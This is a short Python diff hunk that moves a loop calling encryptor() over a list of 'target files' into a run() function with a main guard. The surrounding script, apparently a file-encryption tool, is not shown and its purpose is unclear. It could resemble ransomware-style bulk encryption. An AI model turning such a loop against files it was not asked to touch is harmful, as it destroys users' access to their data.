@@ -65,6 +65,10 @@ else:
     lst_files = [target_file_copy]
 
 # encrypt target files code
-for tf in lst_files:
-    encryptor(tf)
-    print(f"Done encryption with file - {tf}")
+def run():
+    for tf in lst_files:
+        encryptor(tf)
+        print(f"Done encryption with file - {tf}")
+
+if __name__ == "__main__":
+    run()
